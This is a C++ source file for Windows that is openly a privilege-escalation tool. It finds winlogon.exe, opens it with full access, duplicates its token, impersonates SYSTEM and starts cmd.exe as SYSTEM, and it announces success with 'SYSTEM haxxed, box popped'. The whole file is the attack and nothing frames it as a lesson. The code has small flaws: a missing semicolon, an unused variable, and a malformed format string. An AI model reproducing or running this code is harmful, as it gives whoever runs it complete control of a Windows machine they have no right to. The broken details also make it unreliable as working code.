#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <lmcons.h>
#include <string>
#include <iostream>

 

std::wstring getUsername() {

    wchar_t username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameW(username, &username_len);
    return username;

}

 

int main(int argc, WCHAR **argv)

{

    HANDLE hToken;
    LPSTARTUPINFOW si = {};
    PROCESS_INFORMATION pi = { 0 };

    STARTUPINFO si2 = { sizeof(STARTUPINFO) };

    PROCESSENTRY32 entry;

    entry.dwSize = sizeof(PROCESSENTRY32);

    wchar_t wszCommand[] = L"cmd.exe"

    SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
    TOKEN_TYPE tokenType = TokenPrimary;
    HANDLE pNewToken = new HANDLE;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (_wcsicmp(entry.szExeFile, L"winlogon.exe") == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                std::wcout << L"[INFO] Threads owner is now: " << getUsername() << std::endl;
                    if (!hProcess) {
                        printf("[ERROR] Handle capture failed!\n");
                        exit(-1);
                    }
                        else
                    {
                        printf("[INFO] Handle captured, continuing!\n");
                    }


                if (!OpenProcessToken(hProcess, TOKEN_READ | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE, &hToken)) {
                    printf("[ERROR] Token capture failed :( %u\n", GetLastError());
                    exit(-1);
                }
                    else {

                        printf("[INFO] Token captured\n");

                }

                if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken)) {
                    DWORD LastError = GetLastError();
                    fprintf(stderr, "[ERROR] Error duplicating token &u\n", GetLastError());
                }

                if (ImpersonateLoggedOnUser(pNewToken)) {
                    printf("[INFO] SYSTEM haxxed, box popped, changing thread owner\n");
                    SetThreadToken(NULL, pNewToken);
                    std::wcout << L"[INFO] Threads owner is now: " << getUsername() << std::endl;
                    std::wcout << L"[INFO] Spawning CMD as SYSTEM" << std::endl;
                    if (!CreateProcessAsUser(pNewToken, NULL, wszCommand, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si2, &pi)) {
                        CloseHandle(hToken);
                        fprintf(stderr, "CreateProcess threw error %d\n", GetLastError());
                        return -1;
                    }
                }
                else {
                    printf("[ERROR] Something went wrong %u\n", GetLastError());

                }

                CloseHandle(hProcess);

            }

        }

        CloseHandle(snapshot);

    }

    return 0;
}

 
